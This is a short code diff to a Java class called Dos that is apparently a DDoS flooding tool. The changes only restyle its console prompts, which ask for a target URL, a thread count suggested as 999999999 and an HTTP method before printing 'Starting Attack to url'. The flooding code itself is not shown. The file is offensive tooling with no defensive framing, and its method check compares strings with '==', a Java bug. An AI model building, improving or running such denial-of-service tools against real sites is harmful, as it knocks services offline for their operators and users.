@@ -52,7 +52,7 @@ public class Dos implements Runnable {
         int attakingAmoun = 0;
         Dos dos = new Dos(0, 0);
         Scanner in = new Scanner(System.in);
-        System.out.print("Enter Url: ");
+        System.out.print("• URL: ");
         url = in.nextLine();
         System.out.println("\n");
         System.out.println("Starting Attack to url: " + url);
@@ -68,7 +68,7 @@ public class Dos implements Runnable {
 
         System.out.println("Setting DDoS By: Jukie, Shadow Tak");
 
-        System.out.print("Thread: ");
+        System.out.print("• THREAD (999999999): ");
         String amount = in.nextLine();
 
         if (amount == null || amount.equals(null) || amount.equals("")) {
@@ -77,7 +77,7 @@ public class Dos implements Runnable {
             Dos.amount = Integer.parseInt(amount);
         }
 
-        System.out.print("method: ");
+        System.out.print("• METHOD (GET/POST): ");
         String option = in.nextLine();
         int ioption = 1;
         if (option == "get" || option == "GET") {
